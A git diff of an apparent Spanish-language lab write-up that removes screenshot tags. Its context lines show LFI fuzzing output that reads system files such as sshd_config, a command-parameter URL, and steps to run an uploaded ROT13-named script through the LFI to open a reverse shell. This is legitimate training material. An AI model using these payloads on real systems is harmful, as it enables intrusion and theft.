@@ -75,8 +75,6 @@ ID           Response   Lines    Word       Chars       Payload
 000000423:   200        230 L    640 W      6233 Ch     "/etc/ssh/sshd_config"                                                                                                                                                     
 000000508:   200        108 L    254 W      3020 Ch     "/proc/self/cmdline"                                                                                                                                                       
 ```
-<img width="1920" height="998" alt="Captura de pantalla_2026-07-17_11-26-55" src="https://github.com/user-attachments/assets/c99b47c3-ed5a-40ab-a409-d32ef175e818" />
-<img width="1920" height="996" alt="Captura de pantalla_2026-07-17_11-27-07" src="https://github.com/user-attachments/assets/669d6969-9b13-4bdd-b5f7-31174a877f3f" />
 
 ---
 entramos a http://192.168.0.9/NAMARI/index.php?cmd=bash
@@ -141,7 +139,6 @@ Aprovechando la vulnerabilidad LFI combinada con el directorio de subidas `/NAMA
 2. Al validar los nombres de los archivos guardados en el servidor, se detecta un mecanismo de ofuscación basado en el cifrado de sustitución **ROT13**.
 3. Se realiza el criptoanálisis inverso para mapear el nombre real generado por el servidor dentro de `/uploads/`.
 4. Se invoca el script a través del LFI para forzar al servidor a ejecutar el código e iniciar una conexión reversa (*Reverse Shell*).
-<img width="1920" height="1003" alt="conectadonc" src="https://github.com/user-attachments/assets/c99806af-5582-46a1-a7db-c37f012b06de" />
 
 ```bash
 # Escucha en la máquina atacante antes de la ejecución
